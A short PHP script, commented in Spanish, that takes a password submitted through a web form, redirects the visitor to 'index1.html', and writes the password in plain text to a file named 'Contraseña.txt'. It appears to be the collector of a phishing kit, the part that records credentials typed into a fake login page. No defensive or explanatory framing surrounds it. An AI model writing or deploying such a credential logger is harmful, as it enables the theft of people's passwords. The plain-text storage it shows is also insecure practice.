<?php                                                                                   
// Recibo los datos introducidos en el formulario
$Clave = $_POST["Clave"];
header('Location:index1.html');
     // Abro el archivo
     $co = "===========================================\n";
     $cl = "===========================================\n";
     $file=fopen("Contraseña.txt", "w");
     // Le cargo los datos
     $op = "Contraseña:  $Clave\n";  
     fwrite($file, "\n". $co. $op. $cl);
     fclose($file);
?>
 
 
